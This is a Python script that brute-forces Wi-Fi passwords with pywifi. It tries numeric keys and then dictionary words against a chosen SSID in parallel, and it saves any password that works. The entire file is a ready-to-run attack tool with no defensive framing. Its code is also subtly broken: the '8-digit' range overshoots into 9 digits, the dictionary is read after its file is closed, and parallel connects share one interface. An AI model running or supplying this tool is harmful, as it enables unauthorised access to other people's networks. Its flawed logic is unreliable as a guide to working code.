from logging import basicConfig, info, warning, error, debug, INFO
from collections.abc import Generator
from time import sleep
from timeit import default_timer as timer
from concurrent.futures import ThreadPoolExecutor, as_completed
from pywifi import PyWiFi, Profile
from pywifi.iface import Interface
from pywifi.const import IFACE_DISCONNECTED, IFACE_CONNECTED, IFACE_INACTIVE


def main() -> None:
    max_workers = get_max_workers()
    profile = get_profile(
    interface := PyWiFi().interfaces()[0]
    )
    info("Starting Wi-Fi cracking attempt.")
    start_time = timer()
    crack_wifi(interface, profile, max_workers)
    log_time_taken(timer() - start_time)


def get_max_workers() -> int:
    while True:
        try:
            max_workers = int(input("Concurrent connect attempts (recommended: 10): "))
            if max_workers > 15:
                warning("\nToo many concurrent attempts may cause memory overflow.")
                if input("Are you sure about this? (Y/N) ").lower() in "yes": pass
                else: continue
            assert max_workers > 0
            info(f"Using {max_workers} workers for concurrent attempts.")
            return max_workers
        except (AssertionError, ValueError):
            print("Please enter a positive integer.")


def get_profile(interface: Interface) -> Profile:
    interface.scan()
    sleep(3)
    results = interface.scan_results()

    while True:
        ssid = input("SSID: ")
        for network in results:
            if network.ssid == ssid:
                info(f"Found SSID \"{ssid}\", attempting to connect.")
                return interface.add_network_profile(network)
        print(f"{ssid} is not within range.\nPlease try another SSID.")


def disconnect(interface: Interface) -> None:
    for attempt in range(5):
        interface.disconnect()
        if interface.status() in (IFACE_DISCONNECTED, IFACE_INACTIVE):
            return info("Successfully disconnected from the current network.")
        else: warning("\nFailed to disconnect from the current network. Retrying…")
    error("Failed to disconnect from the network after multiple attempts.")
    exit(1)


def connect(interface: Interface, profile: Profile, password: str) -> str | None:
    profile.key = password
    interface.connect(profile)
    sleep(1)
    if interface.status() == IFACE_CONNECTED:
        info(f"Successfully connected with password: {password}")
        return password
    return debug(f"Failed to connect with password: {password}")


def crack_wifi(interface: Interface, profile: Profile, max_workers: int) -> None:
    disconnect(interface)

    info("Starting brute-force attack with 8-digit numbers.")
    passwords = (str(number).zfill(8) for number in range(1_000_000_000))
    attempt_passwords(interface, profile, passwords, max_workers)

    info("8-digit numbers brute-force failed, trying dictionary attack…")
    print("8-digit numbers brute-force failed, trying dictionary attack…")
    try:
        with open("dictionary.txt", 'r', encoding='utf-8', errors='ignore') as dictionary:
            passwords = (line.strip() for line in dictionary)
        attempt_passwords(interface, profile, passwords, max_workers)
    except FileNotFoundError:
        error("Dictionary file not found.")
        print("Dictionary file not found.")

    info("Password not found.")
    print("Password not found. :(")


def attempt_passwords(interface: Interface,
                      profile: Profile,
                      passwords: Generator[str, None, None],
                      max_workers: int) -> None:
    """Attempts to connect to the Wi-Fi with multiple passwords using a thread pool."""
    with ThreadPoolExecutor(max_workers) as executor:
        futures = []
        for password in passwords:
            futures.append(executor.submit(connect, interface, profile, password))
            if len(futures) >= max_workers:
                for future in as_completed(futures):
                    password_result = future.result()
                    if password_result:
                        print(f"Password found: {password_result}")
                        info(f"Found password: {password_result}")
                        with open("found_password.txt", 'w') as file:
                            file.write(password_result)
                        return None
                futures.clear()
    info("Password attempts completed with no success.")


def log_time_taken(time_taken: float) -> None:
    """Log time taken for the cracking attempt."""
    if time_taken < 60:
        info(f"Cracking attempt took {time_taken:.3f} seconds.")
        print(f"Cracking attempt took {time_taken:.3f} seconds.")
    elif time_taken < 3600:
        info(f"Cracking attempt took {time_taken // 60} minutes and {time_taken % 60:.3f} seconds.")
        print(f"Cracking attempt took {time_taken // 60} minutes and {time_taken % 60:.3f} seconds.")
    else:
        info(f"Cracking attempt took {time_taken // 3600} hours, "
             f"{(time_taken % 3600) // 60} minutes and {time_taken % 60:.3f} seconds.")
        print(f"Cracking attempt took {time_taken // 3600} hours, "
              f"{(time_taken % 3600) // 60} minutes and {time_taken % 60:.3f} seconds.")


if __name__ == "__main__":
    basicConfig(filename="wifi_cracking.log", level=INFO, format='%(asctime)s - %(levelname)s - %(message)s')
    main()